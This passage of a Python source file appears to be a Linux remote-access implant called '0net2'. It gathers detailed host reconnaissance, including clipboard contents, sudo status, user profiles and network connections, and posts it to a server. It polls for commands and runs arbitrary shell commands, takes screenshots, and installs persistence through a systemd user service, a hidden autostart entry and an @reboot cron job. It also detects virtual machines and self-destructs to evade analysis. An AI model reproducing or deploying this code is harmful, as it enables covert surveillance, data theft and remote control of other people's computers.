            return line.split("=", 1)[1].strip().strip('"').strip("'")
    return ""

def get_info():
    L = []
    L.append("Hostname : " + socket.gethostname())
    try:
        import pwd as _p
        L.append("User : " + _p.getpwuid(os.getuid()).pw_name)
        L.append("FullUser : " + _p.getpwuid(os.getuid()).pw_gecos)
    except Exception:
        L.append("User : " + os.environ.get("USER", "?"))
    L.append("OS : " + (_osr("PRETTY_NAME") or "?"))
    L.append("Version : " + _osr("VERSION_ID"))
    L.append("Kernel : " + platform.release())
    L.append("Arch : " + platform.machine())
    L.append("CPU : " + str(os.cpu_count() or 0))
    mi = rd("/proc/meminfo")
    for label, pat in (("RAM (MB)", r'MemTotal:\s+(\d+)'), ("RAMFree", r'MemAvailable:\s+(\d+)')):
        m = re.search(pat, mi)
        if m:
            L.append("%s : %d" % (label, int(m.group(1)) // 1024))
    for label, val in (("PID", os.getpid()), ("PY", platform.python_version()), ("Client", DEVICE_ID),
                       ("Build", BUILD), ("VmGuard", VMBLOCK), ("Enrolled", bool(SECRET)),
                       ("Poll", str(POLLSEC) + "s"), ("Cwd", CWD), ("Server", SERVER),
                       ("ServerAlt", SERVER_ALT or "-")):
        L.append("%s : %s" % (label, val))
    L.append("Time : " + time.strftime("%Y-%m-%dT%H:%M:%S%z"))

    L.append("\n--- identity ---")
    L.append("UID : %d / GID : %d" % (os.getuid(), os.getgid()))
    L.append("Groups : " + run(["id"], 1.0))
    L.append("Elevated : " + str(os.geteuid() == 0))
    L.append("TTY : " + (run(["sh", "-c", "tty 2>/dev/null || echo ?"], 1.0) or "?"))
    L.append("SSH : " + (os.environ.get("SSH_CONNECTION") or "-"))
    L.append("Session : " + (os.environ.get("XDG_SESSION_TYPE") or "-"))
    L.append("Display : " + (os.environ.get("DISPLAY") or "-"))

    L.append("\n--- operating system ---")
    L.append("Distro : " + (_osr("ID") + " " + _osr("VERSION_CODENAME")).strip())
    L.append("Install : " + run(["sh", "-c", "stat -c %y / 2>/dev/null"], 1.0))
    L.append("LastBoot : " + run(["sh", "-c", "uptime -s 2>/dev/null"], 1.0))
    try:
        up = float(rd("/proc/uptime").split()[0])
        L.append("Uptime : %dd %s" % (int(up // 86400), time.strftime("%H:%M:%S", time.gmtime(up % 86400))))
    except Exception:
        pass
    L.append("TimeZone : " + (time.strftime("%Z") or "-"))
    L.append("Locale : " + (os.environ.get("LANG") or "-"))

    L.append("\n--- hardware ---")
    L.append("Vendor : " + rd("/sys/class/dmi/id/sys_vendor"))
    L.append("Model : " + rd("/sys/class/dmi/id/product_name"))
    L.append("Board : " + (rd("/sys/class/dmi/id/board_vendor") + " " + rd("/sys/class/dmi/id/board_name")).strip())
    L.append("BIOS : " + (rd("/sys/class/dmi/id/bios_vendor") + " " + rd("/sys/class/dmi/id/bios_version")).strip())
    cpu = ""
    for line in rd("/proc/cpuinfo").split("\n"):
        if line.lower().startswith("model name"):
            cpu = line.split(":", 1)[1].strip()
            break
    L.append("CPUName : " + cpu)
    L.append("GPU : " + run(["sh", "-c", "lspci 2>/dev/null | grep -iE 'vga|3d|display' | head -n 2"], 2.0))

    L.append("\n--- storage ---")
    seen = set()
    for line in rd("/proc/mounts").split("\n"):
        f = line.split()
        if len(f) < 3 or not f[0].startswith("/dev/") or f[2] in ("squashfs", "tmpfs") or f[1] in seen:
            continue
        seen.add(f[1])
        try:
            u = shutil.disk_usage(f[1])
            L.append("Drive : %s %s %.1fGB free / %.1fGB" % (f[0], f[1], u.free / 1073741824, u.total / 1073741824))
        except Exception:
            pass
        if len(seen) >= 12:
            break

    L.append("\n--- network ---")
    for n, ip, mac in _ifs():
        L.append("Iface : %s %s %s" % (n, ip, mac))
    L.append("Gateway : " + run(["sh", "-c", "ip route 2>/dev/null | awk '/default/{print $3; exit}'"], 1.0))
    L.append("DNS : " + ", ".join(l.split()[1] for l in rd("/etc/resolv.conf").split("\n")
                                  if l.startswith("nameserver") and len(l.split()) > 1)[:200])
    L.append("PublicIP : " + pub_ip())
    lp, est = _ports()
    L.append("ListenTCP: " + ",".join(str(p) for p in lp[:40]))
    for c in est:
        L.append("Conn : " + c)

    L.append("\n--- security ---")
    L.append("SELinux : " + (run(["getenforce"], 1.0) or ("enforcing" if os.path.isdir("/sys/fs/selinux") else "-")))
    L.append("AppArmor : " + ("yes" if os.path.isdir("/sys/kernel/security/apparmor") else "-"))
    L.append("Firewall : " + (run(["sh", "-c", "ufw status 2>/dev/null | head -n 1"], 2.0)
                              or run(["sh", "-c", "firewall-cmd --state 2>/dev/null"], 2.0) or "-"))
    L.append("Fail2ban : " + (run(["sh", "-c", "systemctl is-active fail2ban 2>/dev/null"], 1.5) or "-"))
    L.append("ClamAV : " + ("yes" if shutil.which("clamscan") else "-"))
    L.append("Sudoers : " + ("yes" if os.path.exists("/etc/sudoers") else "-"))
    L.append("SudoNoPass : " + ("yes" if run(["sh", "-c", "sudo -n true 2>/dev/null && echo ok"], 2.0) else "-"))

    L.append("\n--- discovery ---")
    v = test_vm()
    L.append("Virtual : " + (v["label"] or "physical"))
    L.append("Shares : " + (rd("/etc/exports").replace("\n", "; ")[:200]
                            or run(["sh", "-c", "grep -E '^\\[[^]]+\\]' /etc/samba/smb.conf 2>/dev/null | tr -d '[]' | tr '\\n' ','"], 1.5) or "-"))
    homes = []
    for base in ("/home", "/root"):
        try:
            homes += [n for n in os.listdir(base) if os.path.isdir(os.path.join(base, n))]
        except Exception:
            pass
    L.append("Profiles : " + ", ".join(homes[:20]))
    L.append("Cron : " + run(["sh", "-c", "crontab -l 2>/dev/null | grep -v '^#' | head -n 8"], 2.0).replace("\n", " | "))

    L.append("\n--- clipboard ---")
    cb = ""
    for c in (["wl-paste", "-n"], ["xclip", "-selection", "clipboard", "-o"], ["xsel", "-b", "-o"]):
        if shutil.which(c[0]):
            cb = run(c, 2.0)
            if cb:
                break
    L.append((cb[:500] + "...") if len(cb) > 500 else (cb or "(empty)"))

    L.append("\n--- top processes ---")
    for rss, name, pid in _procs():
        L.append("Proc : %s pid=%s mem=%dMB" % (name, pid, rss))

    L.append("\n--- software (sample) ---")
    apps = _pkgs()
    L.append("AppCount : " + str(len(apps)))
    for a in apps[:20]:
        L.append("App : " + a)
    return "\n".join(L)

# --- command runner ---
# output goes to a file, not a pipe: a spawned gui app inherits the handle and a
# pipe would block until it exits.

def run_cmd(line):
    global CWD
    if not line:
        return ""
    if re.match(r'(?i)\s*pwd\s*$', line):
        return CWD + "\n"
    m = re.match(r'(?i)\s*(cd|chdir)\b\s*(.*)$', line)
    if m:
        arg = m.group(2).strip().strip('"').strip("'")
        if not arg:
            return CWD + "\n"
        arg = os.path.expanduser(arg)
        full = os.path.realpath(arg if os.path.isabs(arg) else os.path.join(CWD, arg))
        if os.path.isdir(full):
            CWD = full
            return ""
        return "cd: " + arg + ": No such file or directory\n"

    out = os.path.join(TMP, "out_" + binascii.hexlify(os.urandom(8)).decode() + ".tmp")
    f = None
    try:
        f = open(out, "wb")
        p = subprocess.Popen(["/bin/sh", "-c", line], cwd=CWD, stdin=subprocess.DEVNULL,
                             stdout=f, stderr=subprocess.STDOUT, start_new_session=True)
        try:
            p.wait(timeout=CMDTMO)
            tail = ""
        except subprocess.TimeoutExpired:
            p.kill()
            p.wait()
            tail = "\n[timeout after %ds]" % int(CMDTMO)
        f.close()
        f = None
        with open(out, "rb") as r:
            return r.read(OUTMAX).decode("utf-8", "replace") + tail
    except Exception as e:
        return "ERROR: " + str(e)
    finally:
        if f:
            try:
                f.close()
            except Exception:
                pass
        try:
            os.unlink(out)
        except Exception:
            pass

# --- vm guard ---

def test_vm():
    hits = []
    label = ""

    def note(pat, lab):
        nonlocal label
        hits.append(pat)
        if not label:
            label = lab

    dmi = " ".join(rd("/sys/class/dmi/id/" + k) for k in
                   ("sys_vendor", "product_name", "product_version", "board_vendor",
                    "board_name", "bios_vendor", "bios_version", "chassis_vendor")).lower()
    for pat, lab in ((r"vmware", "VMware"), (r"virtualbox|innotek", "VirtualBox"),
                     (r"hyper-?v|virtual machine", "Hyper-V"), (r"qemu|kvm|proxmox|standard pc", "QEMU/KVM"),
                     (r"xen|hvm domu", "Xen"), (r"parallels", "Parallels"),
                     (r"bochs|bhyve|nutanix|ahv", "hypervisor"),
                     (r"amazon ec2|google compute|digitalocean|linode|vultr|hetzner", "cloud")):
        if re.search(pat, dmi):
            note("dmi", lab)
            break
    cpu = rd("/proc/cpuinfo").lower()
    if " hypervisor" in cpu or "qemu" in cpu:
        note("cpuinfo", "hypervisor")
    for p in ("vboxguest", "vmwgfx", "virtio_balloon", "hv_vmbus", "xen_blkfront", "qemu_fw_cfg"):
        if os.path.isdir("/sys/module/" + p):
            note("module", "hypervisor")
            break
    for dev in ("/dev/vda", "/dev/vdb", "/dev/xvda", "/dev/sda"):
        if os.path.exists(dev):
            b = os.path.basename(dev)
            try:
                link = os.path.realpath(dev).lower()
            except Exception:
                link = ""
            if "vd" in b or "virtio" in link:
                note("disk", "hypervisor")
            break
    if re.search(r'vmware|vbox|qemu|xen|msft|prl', rd("/proc/scsi/scsi").lower()):
        note("scsi", "hypervisor")
    names = " ".join(n for _, n, _ in _procs()).lower()
    if re.search(r'vmtoolsd|vboxservice|vboxtray|qemu-ga|xenservice|prl_tools|prl_cc|hv_kvp_daemon', names):
        note("tools", "hypervisor")
    if os.path.exists("/.dockerenv"):
        note("docker", "container")
    if not hits:
        return {"vm": False, "label": "", "hits": ""}
    return {"vm": True, "label": label or "hypervisor", "hits": ",".join(hits)}

# --- persistence ---

def write_launcher():
    if os.path.exists(LAUNCH):
        return
    try:
        with open(LAUNCH, "w", encoding="utf-8") as f:
            f.write(
                "#!/bin/sh\n"
                "d=$(cd \"$(dirname \"$0\")\" 2>/dev/null && pwd) || exit 0\n"
                "[ -n \"${HOME:-}\" ] || exit 0\n"
                "[ -n \"${DISPLAY:-}\" ] || export DISPLAY=:0\n"
                "[ -n \"${XAUTHORITY:-}\" ] || { [ -f \"$HOME/.Xauthority\" ] && export XAUTHORITY=\"$HOME/.Xauthority\"; }\n"
                "if [ -z \"${WAYLAND_DISPLAY:-}\" ] && [ -n \"${XDG_RUNTIME_DIR:-}\" ] && [ -S \"$XDG_RUNTIME_DIR/wayland-0\" ]; then\n"
                "    export WAYLAND_DISPLAY=wayland-0\n"
                "fi\n"
                "py=\n"
                "for c in python3 python3.13 python3.12 python3.11 python3.10 python3.9 python3.8 python3.7 python3.6 python; do\n"
                "    command -v \"$c\" >/dev/null 2>&1 && { py=$(command -v \"$c\"); break; }\n"
                "done\n"
                "[ -n \"$py\" ] || exit 0\n"
                "exec setsid \"$py\" \"$d/client.py\" --detached\n")
        os.chmod(LAUNCH, 0o700)
    except Exception:
        pass

def _user():
    try:
        import pwd
        return pwd.getpwuid(os.getuid()).pw_name
    except Exception:
        return os.environ.get("USER", "")

def _cron(remove=False):
    if not shutil.which("crontab"):
        return
    cur = run(["sh", "-c", "crontab -l 2>/dev/null"], 3.0)
    if remove:
        if LAUNCH not in cur:
            return
        new = "\n".join(l for l in cur.split("\n") if LAUNCH not in l)
    else:
        if LAUNCH in cur:
            return
        new = (cur + "\n" if cur else "") + '@reboot "' + LAUNCH + '" >/dev/null 2>&1\n'
    try:
        p = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p.communicate(new.encode(), timeout=5)
    except Exception:
        pass

def _systemd(on):
    if not shutil.which("systemctl") or not os.path.isdir("/run/systemd/system"):
        return
    if not on:
        run(["systemctl", "--user", "disable", "--now", "0net2.service"], 8.0)
        try:
            os.unlink(UNIT)
        except Exception:
            pass
        run(["systemctl", "--user", "daemon-reload"], 5.0)
        return
    try:
        os.makedirs(UNITDIR, exist_ok=True)
        with open(UNIT, "w", encoding="utf-8") as f:
            f.write("[Unit]\nDescription=0net2 client\nAfter=network-online.target\n\n"
                    "[Service]\nType=simple\nExecStart=" + LAUNCH + "\n"
                    "Restart=always\nRestartSec=5\nKillMode=process\n\n"
                    "[Install]\nWantedBy=default.target\n")
        run(["systemctl", "--user", "daemon-reload"], 5.0)
        run(["systemctl", "--user", "enable", "--now", "0net2.service"], 8.0)
        u = _user()
        if u:
            run(["loginctl", "enable-linger", u], 5.0)
    except Exception:
        pass

def _autostart(on):
    try:
        if on:
            os.makedirs(AUTODIR, exist_ok=True)
            with open(AUTO, "w", encoding="utf-8") as f:
                f.write("[Desktop Entry]\nType=Application\nName=0net2\nExec=" + LAUNCH +
                        "\nTerminal=false\nX-GNOME-Autostart-enabled=true\nNoDisplay=true\n")
        else:
            os.unlink(AUTO)
    except Exception:
        pass

def set_persist():
    write_launcher()
    _systemd(True)
    _autostart(True)
    _cron()

def strip_persist():
    _systemd(False)
    _autostart(False)
    _cron(True)

# --- dispatch ---
# commands arrive as "<cmd> (ID-XXXXXX)"

def invoke_remote(raw):
    global SECRET, KEYSTR, SERVER, SERVER_ALT, POLLSEC
    t = (raw or "").strip()
    if not t:
        return
    cmd_id = ""
    m = re.search(r'\(ID-([A-Z0-9]{6})\)\s*$', t)
    if m:
        cmd_id = m.group(1)
        t = t[:m.start()].rstrip()
    if cmd_id:
        if cmd_id in SEEN:
            return
        SEEN[cmd_id] = 1
        if len(SEEN) > 2000:
            SEEN.clear()
    if not t:
        return
    log("CMD [" + cmd_id + "] " + t)

    if t == "info":
        send("/info", cmd_id + "\n" + get_info())
    elif t == "shellquit":
        pass
    elif t == "forget":
        SECRET = ""
        save_cfg()
        log("FORGET")
        if cmd_id:
            send("/result", cmd_id + "\nforget\nsecret cleared")
    elif t == "remove":
        log("REMOVE")
        strip_persist()
        time.sleep(0.3)
        for p in (CFG, IDF, VMFLAG, LAUNCH, SCRIPT):
            try:
                os.unlink(p)
            except Exception:
                pass
        shutil.rmtree(TMP, ignore_errors=True)
        os._exit(0)
    elif t.startswith("updatekey "):
        nk = t[10:].strip()
        if nk:
            KEYSTR = nk
            save_cfg()
            log("NEWKEY " + nk)
    elif t.startswith("updateserver "):
        nu = t[13:].strip().rstrip("/")
        if nu:
            if not re.match(r'^https?://', nu):
                nu = "https://" + nu
            SERVER = nu
            save_cfg()
            log("NEWSERVER " + nu)
    elif t.startswith("sleep "):
        try:
            n = int(t[6:].strip())
            if 1 <= n <= 3600:
                POLLSEC = n
        except Exception:
            pass
    elif t.startswith("shellcmd "):
        sh = t[9:]
        send("/result", cmd_id + "\n" + sh + "\n" + run_cmd(sh))
    elif t.startswith("screenshot"):
        p = t.split(" ", 1)
        tid = p[1].strip() if len(p) > 1 else ""
        if not tid:
            return
        f = os.path.join(TMP, "shot_" + tid + ".png")
        try:
            take_shot(f)
            send_file(f, tid)
        except Exception as e:
            log("SHOT FAIL " + str(e))
            if cmd_id:
                send("/result", cmd_id + "\nscreenshot\nERROR: " + str(e))
        finally:
            try:
                os.unlink(f)
            except Exception:
                pass
    else:
        out = run_cmd(t)
        if cmd_id:
            send("/result", cmd_id + "\n" + t + "\n" + out)

# --- main ---

def dump_status():
    for k, v in (("build", BUILD), ("server", SERVER), ("alt", SERVER_ALT or "-"),
                 ("client", DEVICE_ID), ("enrolled", bool(SECRET)), ("poll", str(POLLSEC) + "s"),
                 ("dir", DIR), ("log", LOGF)):
        print("%-9s: %s" % (k, v))
    print("running  : " + (", ".join(str(p) for p, cl in _cmdlines() if SCRIPT in cl) or "no"))
    print()
    try:
        with open(LOGF, "r", encoding="utf-8", errors="replace") as f:
            print("\n".join(f.read().splitlines()[-40:]) or "(log empty)")
    except Exception as e:
        print("(no log: " + str(e) + ")")

def main():
    global FAIL
    args = sys.argv[1:]
    show = "--show" in args
    test = "--test" in args

    load_cfg()
    init_identity()

    if "--kill" in args:
        print("killed " + str(stop_old()))
        return
    if "--status" in args:
        dump_status()
        return
    if "--uninstall" in args:
        stop_old()
        strip_persist()
        for p in (SCRIPT, LAUNCH, CFG, IDF, VMFLAG):
            try:
                os.unlink(p)
            except Exception:
                pass
        shutil.rmtree(TMP, ignore_errors=True)
        print("uninstalled")
        return

    if os.path.exists(VMFLAG) and not test:
        if show:
            print("[vm] blocked - delete " + VMFLAG + " to re-arm")
        return

    if not ("--detached" in args or show or test):
        daemonize()

    # holder of the lock wins and is never killed. the loser retries for 30s so a
    # systemd restart and a cron start settle instead of fighting.
    if not test:
        got = take_lock()
        for _ in range(60):
            if got is not None:
                break
            time.sleep(0.5)
            got = take_lock()
        if got is None:
            log("already running - exiting")
            return

    if test:
        print("build : " + BUILD)
        print("server : " + SERVER)
        print("alt : " + (SERVER_ALT or "-"))
        print("epoch ms : " + now_ms())
        print("client : " + DEVICE_ID)
        print("ua : " + UA)
        print("vmguard : " + str(VMBLOCK))
        print("vm : " + (test_vm()["label"] or "physical"))
        print("enrolled : " + str(bool(SECRET)))
        print("cwd : " + CWD)
        print("log : " + LOGF)
        for label, url in (("primary", SERVER), ("alt", SERVER_ALT)):
            if not url:
                continue
            try:
                ips = sorted({i[4][0] for i in urllib.parse.urlsplit(url).hostname
                              and socket.getaddrinfo(urllib.parse.urlsplit(url).hostname, None)})
                print("dns " + label + " : " + ", ".join(ips))
            except Exception as e:
                print("dns " + label + " : FAIL " + type(e).__name__)
        r = http("GET", "/", None, auth_headers("secret" if SECRET else "global"))
        print("GET code : " + str(r["code"]) + (" " + r["err"] if r["err"] else ""))
        print("key mode : " + r["keymode"])
        if r["enroll"]:
            print("enroll : " + r["enroll"])
        print("body : " + (r["body"][:200] if r["body"] else "empty -> auth OK"))
        print("POST : " + str(send("/info", "TEST\n" + get_info())["code"]))
        sp = os.path.join(TMP, "shot_test.png")
        try:
            take_shot(sp)
            print("shot : ok " + str(os.path.getsize(sp)) + " bytes")
        except Exception as e:
            print("shot : FAIL " + str(e))
        finally:
            try:
                os.unlink(sp)
            except Exception:
                pass
        return

    if VMBLOCK:
        v = test_vm()
        if v["vm"]:
            log("VM " + v["label"] + " [" + v["hits"] + "] -> destroy")
            try:
                poll()
            except Exception:
                pass
            rep = ("VM-DETECTED: %s\nVM-SIGNAL: %s\nVM-BUILD: %s\n\n"
                   % (v["label"], v["hits"], BUILD)) + get_info()
            try:
                send("/info", binascii.hexlify(os.urandom(3)).decode("ascii").upper() + "\n" + rep)
            except Exception:
                pass
            try:
                with open(VMFLAG, "w", encoding="utf-8") as f:
                    f.write("vm " + v["label"] + " " + time.strftime("%Y-%m-%dT%H:%M:%S") + "\n")
            except Exception:
                pass
            strip_persist()
            time.sleep(0.5)
            for p in (CFG, IDF, LAUNCH, SCRIPT):
                try:
                    os.unlink(p)
                except Exception:
                    pass
            shutil.rmtree(TMP, ignore_errors=True)
            os._exit(0)
        log("guard armed, host looks physical")

    set_persist()
    save_cfg()
    log("--- start %s client=%s server=%s alt=%s" % (BUILD, DEVICE_ID, SERVER, SERVER_ALT or "-"))

    import random
    while True:
        err = False
        for _ in range(8):
            try:
                r = poll()
            except Exception as e:
                log("POLL FAIL " + str(e))
                err = True
                break
            if not r["ok"]:
                err = True
                break
            if not r["text"]:
                break
            try:
                invoke_remote(r["text"])
            except Exception as e:
                log("DISPATCH FAIL " + str(e))
        if err:
            FAIL += 1
            time.sleep(min(60, 2 ** min(FAIL, 6)))
        else:
            FAIL = 0
            time.sleep(POLLSEC + random.randint(0, 800) / 1000.0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        log("FATAL " + str(e))
        sys.exit(1)
